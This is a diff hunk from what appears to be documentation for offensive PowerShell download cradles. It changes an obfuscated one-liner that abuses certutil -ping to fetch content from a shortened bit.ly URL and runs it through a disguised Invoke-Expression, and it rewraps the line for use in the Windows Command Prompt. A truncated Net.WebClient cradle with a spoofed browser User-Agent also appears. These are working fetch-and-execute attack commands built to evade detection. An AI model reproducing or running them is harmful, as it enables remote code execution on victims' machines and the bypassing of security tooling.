@@ -15,10 +15,10 @@ powershell "$down=New-Object Net.WebClient;$down.Headers['User-Agent']='Mozilla/
 
 or
 
-iex(((C:\Windows\System32\certutil -ping https://bit.ly/2tZuas2|&(GV *ecu*t -ValueOn).InvokeComm
-and.(((GV *ecu*t -ValueOn).InvokeCommand.PsObject.Methods|Where-Object{$_.Name-ilike'Ge*ts'}).Name).Invoke('*ct-Ob*')-Sk
-ip 2|&(GV *ecu*t -ValueOn).InvokeCommand.(((GV *ecu*t -ValueOn).InvokeCommand.PsObject.Methods|Where-Object{$_.Name-ilik
-e'Ge*ts'}).Name).Invoke('*ct-Ob*')-SkipLast 1)-Join"`r`n"))
+powershell "iex(((C:\Windows\System32\certutil -ping https://bit.ly/2tZuas2|&(GV *ecu*t -ValueOn
+).InvokeCommand.(((GV *ecu*t -ValueOn).InvokeCommand.PsObject.Methods|Where-Object{`$_.Name-ilike'Ge*ts'}).Name).Invoke(
+'*ct-Ob*')-Skip 2|&(GV *ecu*t -ValueOn).InvokeCommand.(((GV *ecu*t -ValueOn).InvokeCommand.PsObject.Methods|Where-Object
+{`$_.Name-ilike'Ge*ts'}).Name).Invoke('*ct-Ob*')-SkipLast 1)-Join'`r`n'))"
 
 
 In the Windows Command Prompt.
